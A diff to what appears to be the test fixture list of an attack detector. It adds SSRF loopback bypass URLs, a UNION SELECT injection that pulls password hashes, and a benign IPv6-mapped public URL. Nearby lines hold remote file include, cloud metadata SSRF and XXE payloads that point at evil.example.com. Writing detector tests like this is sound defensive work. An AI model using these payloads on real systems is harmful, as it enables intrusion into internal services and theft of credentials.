@@ -223,6 +223,8 @@ ATTACKS: list[tuple[str, bytes]] = [
     ("fileincl_json_rfi_txt", b'{"include":"http://evil.example.com/payload.txt"}'),
     ("ssrf_bare_metadata_host", b"http://metadata/computeMetadata/v1/instance/"),
     ("ssrf_instance_data_host", b"http://instance-data/latest/meta-data/"),
+    ("ssrf_ipv4_mapped_ipv6_loopback_bracket", b"http://[::ffff:127.0.0.1]/"),
+    ("ssrf_localhost_trailing_dot", b"http://localhost./"),
     (
         "sqli_union_comment_spaced",
         b"UNION /**/ SELECT /**/ username,password /**/ FROM /**/ users",
@@ -234,6 +236,10 @@ ATTACKS: list[tuple[str, bytes]] = [
     (
         "xml_xxe_public_no_system",
         b'<!DOCTYPE foo PUBLIC "-//X//Y" "http://evil.example.com/evil.dtd">',
+    ),
+    (
+        "scan_value_cap_regression_ordinary_sqli_still_detected",
+        b"1 OR 1=1 UNION SELECT password_hash FROM admin_users--",
     ),
 ]
 
@@ -285,6 +291,7 @@ BENIGN: list[tuple[str, bytes]] = [
         "ssrf_benign_metadata_word",
         b'{"note":"please update the metadata for this record"}',
     ),
+    ("ssrf_benign_ipv4_mapped_ipv6_public_bracket", b"http://[::ffff:8.8.8.8]/"),
     ("sqli_benign_comment", b"SELECT * /* all active */ FROM users WHERE active = 1"),
     ("codeinj_benign_vars_config", b"vars(config)['DEBUG']"),
     (
